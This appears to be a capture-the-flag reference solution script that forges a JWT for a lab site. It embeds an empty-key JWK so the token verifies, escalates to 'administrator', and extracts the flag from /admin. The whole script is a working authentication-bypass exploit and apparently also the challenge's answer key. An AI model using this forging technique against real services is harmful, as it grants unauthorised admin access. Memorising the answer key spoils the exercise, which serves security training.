#!/usr/bin/env bash
# Reference solution: Keyring, the token supplies its own verification key.
#
# When the header carries an embedded JWK the server verifies with that key
# instead of its own. An empty key is a perfectly good HMAC secret, so a token
# signed with the empty string verifies.
set -euo pipefail
BASE="${BASE:-https://northwind-04-keyring.vercel.app}"
here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=./http.sh
source "$here/http.sh"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

echo "== 1. sign in and capture a genuine token =="
"${HTTP[@]}" -s -m 30 -c "$JAR" -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"
TOKEN=$(awk '/session/{print $7}' "$JAR")
echo "   session cookie captured (${#TOKEN} bytes)"

echo
echo "== 2. replay the genuine token against /admin =="
"${HTTP[@]}" -s -m 30 -b "$JAR" -o /dev/null -w '   HTTP %{http_code}\n' "$BASE/admin"

echo
echo "== 3. forge a token carrying its own empty signing key =="
FORGED=$(python3 "$here/forge.py" --jwk '' --sub administrator --original "$TOKEN" | tail -1)

echo
echo "== 4. replay it against /admin =="
"${HTTP[@]}" -s -m 30 -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}' | head -1
